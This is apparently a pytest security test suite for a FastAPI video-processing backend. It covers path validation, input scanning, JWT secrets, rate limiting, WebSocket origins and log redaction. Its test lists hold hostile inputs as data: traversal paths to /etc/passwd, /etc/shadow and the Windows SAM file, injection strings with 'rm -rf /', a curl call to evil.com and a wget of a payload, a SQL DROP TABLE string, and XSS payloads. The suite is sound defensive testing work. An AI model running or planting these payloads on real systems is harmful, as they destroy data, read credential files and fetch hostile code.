"""
Security Compliance Integration Tests
Blueprint.md compliant test suite
"""
import pytest
import asyncio
import json
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock
import sys
import os

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from backend_service_final import app, validate_video_path, _pytector_scan
from fastapi.testclient import TestClient
from fastapi import HTTPException
import jwt


class TestSecurityCompliance:
    """Test security measures are working correctly"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    def test_path_traversal_prevention(self):
        """Test that path traversal attacks are blocked"""
        malicious_paths = [
            "../../../etc/passwd",
            "../../../../../../etc/shadow",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "..\\..\\..\\Windows\\System32",
            "/Users/hawzhin/../../etc/passwd"
        ]
        
        for path in malicious_paths:
            with pytest.raises(HTTPException) as exc:
                validate_video_path(path)
            assert exc.value.status_code == 422
    
    def test_valid_paths_allowed(self):
        """Test that valid paths are accepted"""
        # Create a temp file in allowed directory
        with tempfile.NamedTemporaryFile(
            dir="/tmp", 
            suffix=".mp4", 
            delete=False
        ) as tmp:
            tmp_path = tmp.name
        
        try:
            validated = validate_video_path(tmp_path)
            assert validated == tmp_path
        finally:
            os.unlink(tmp_path)
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        malicious_inputs = [
            "video.mp4; rm -rf /",
            "'; DROP TABLE users; --",
            "$(curl http://evil.com/steal)",
            "video.mp4 && wget http://malware.com/payload",
            "`cat /etc/passwd`"
        ]
        
        for payload in malicious_inputs:
            with pytest.raises(HTTPException) as exc:
                _pytector_scan({"input": payload})
            assert exc.value.status_code == 422
            assert "security scan rejected" in str(exc.value.detail).lower()
    
    def test_jwt_secret_enforcement(self):
        """Test JWT secret is properly enforced"""
        # Test that default secret is rejected in production
        with patch.dict(os.environ, {"AUTORESOLVE_ENV": "production", "JWT_SECRET": "change-me"}):
            with pytest.raises(RuntimeError) as exc:
                from backend_service_final import _enforce_production_secrets
                _enforce_production_secrets()
            assert "JWT_SECRET must be set" in str(exc.value)
    
    def test_rate_limiting_auth(self, client):
        """Test rate limiting on auth endpoints"""
        # Make multiple rapid requests
        for i in range(10):
            response = client.post("/auth/login", json={
                "username": "test",
                "password": "wrong"
            })
            
            if i < 5:
                # First 5 should work (but fail auth)
                assert response.status_code == 401
            else:
                # After 5, should be rate limited
                if response.status_code == 429:
                    assert "rate limit" in response.text.lower()
    
    def test_websocket_csrf_protection(self, client):
        """Test WebSocket CSRF protection in production"""
        with patch.dict(os.environ, {"AUTORESOLVE_ENV": "production"}):
            with client.websocket_connect(
                "/ws/status",
                headers={"origin": "http://evil.com"}
            ) as websocket:
                # Should be rejected
                data = websocket.receive()
                assert data.get("code") == 1008
    
    def test_size_limit_enforcement(self):
        """Test request size limits are enforced"""
        # Create oversized payload
        large_payload = {"data": "x" * (MAX_FIELD_SIZE + 1)}
        
        with pytest.raises(HTTPException) as exc:
            _pytector_scan(large_payload)
        assert exc.value.status_code == 422
        assert "exceeds size limit" in str(exc.value.detail)
    
    def test_xss_prevention(self):
        """Test XSS attack prevention"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            with pytest.raises(HTTPException) as exc:
                _pytector_scan({"input": payload})
            assert exc.value.status_code == 422
            assert "script injection" in str(exc.value.detail).lower()


class TestErrorHandling:
    """Test error handling patterns"""
    
    def test_standardized_error_responses(self, client):
        """Test that errors follow standard format"""
        response = client.get("/nonexistent")
        assert response.status_code == 404
        
        # Check error format
        if response.headers.get("content-type") == "application/json":
            error_data = response.json()
            assert "detail" in error_data or "error" in error_data
    
    def test_no_sensitive_data_in_errors(self, client):
        """Test that errors don't leak sensitive information"""
        response = client.post("/auth/login", json={
            "username": "admin",
            "password": "wrong_password"
        })
        
        # Should not reveal if user exists
        assert "Invalid credentials" in response.text
        assert "user not found" not in response.text.lower()
        assert "wrong password" not in response.text.lower()


class TestLoggingSanitization:
    """Test logging sanitization"""
    
    def test_password_sanitization(self):
        """Test passwords are sanitized in logs"""
        from src.utils.secure_logger import SecureFormatter
        
        sensitive_messages = [
            'User login with password: "secretpass123"',
            'Token: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
            'API key: sk-1234567890abcdef',
            'Processing /Users/hawzhin/private/video.mp4'
        ]
        
        formatter = SecureFormatter()
        for msg in sensitive_messages:
            sanitized = formatter.sanitize_message(msg)
            assert "secretpass123" not in sanitized
            assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" not in sanitized
            assert "sk-1234567890abcdef" not in sanitized
            assert "/Users/hawzhin" not in sanitized
    
    def test_structured_log_sanitization(self):
        """Test structured logging sanitization"""
        from src.utils.secure_logger import StructuredLogger
        
        logger = StructuredLogger("test")
        
        # Test that sensitive fields are redacted
        sensitive_data = {
            "username": "testuser",
            "password": "secret123",
            "token": "bearer-token-value",
            "api_key": "sk-secret-key",
            "safe_field": "this is ok"
        }
        
        sanitized = logger._sanitize_dict(sensitive_data)
        assert sanitized["password"] == "[REDACTED]"
        assert sanitized["token"] == "[REDACTED]"
        assert sanitized["api_key"] == "[REDACTED]"
        assert sanitized["safe_field"] == "this is ok"
        assert sanitized["username"] == "testuser"


class TestPerformanceOptimizations:
    """Test performance optimizations"""
    
    def test_vectorized_rms_calculation(self):
        """Test vectorized RMS is faster than loop version"""
        from src.ops.silence import SilenceRemover
        import numpy as np
        import time
        
        # Create test audio
        sr = 22050
        duration = 10  # seconds
        samples = np.random.randn(sr * duration)
        
        remover = SilenceRemover()
        
        # Test vectorized version
        start = time.time()
        windows = remover.detect_speech_windows(y=samples, sr=sr)
        vectorized_time = time.time() - start
        
        # Should complete in reasonable time
        assert vectorized_time < 1.0  # Should process 10s audio in < 1s
        assert isinstance(windows, list)
    
    @pytest.mark.asyncio
    async def test_async_silence_detection(self):
        """Test async silence detection doesn't block"""
        from src.ops.silence import SilenceRemover
        
        # Create test video file
        with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as tmp:
            tmp_path = tmp.name
        
        try:
            remover = SilenceRemover()
            
            # Should not block event loop
            result = await remover.remove_silence_async(tmp_path)
            assert isinstance(result, dict)
            assert "keep_windows" in result
        except Exception as e:
            # Expected if ffmpeg not available in test env
            if "ffmpeg" not in str(e).lower():
                raise
        finally:
            os.unlink(tmp_path)


class TestConnectionPooling:
    """Test connection pooling in Swift client"""
    
    def test_swift_connection_pool_config(self):
        """Verify Swift connection pool is properly configured"""
        # This would be tested in Swift unit tests
        # Here we verify the configuration is correct
        swift_code = Path("/Users/hawzhin/AutoResolve/AutoResolvePro.swift").read_text()
        
        assert "httpMaximumConnectionsPerHost = 5" in swift_code
        assert "URLSessionConfiguration.default" in swift_code
        assert "connectionPool = URLSession(configuration: config)" in swift_code


class TestTaskCancellation:
    """Test task cancellation in Swift"""
    
    def test_swift_task_cancellation(self):
        """Verify Swift implements proper task cancellation"""
        swift_code = Path("/Users/hawzhin/AutoResolve/AutoResolvePro.swift").read_text()
        
        # Check for task cancellation
        assert "healthCheckTask?.cancel()" in swift_code
        assert "Task.isCancelled" in swift_code
        assert "deinit" in swift_code
        assert "cleanup()" in swift_code


# Constants from backend (for testing)
MAX_FIELD_SIZE = 50 * 1024
MAX_REQUEST_SIZE = 500 * 1024


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])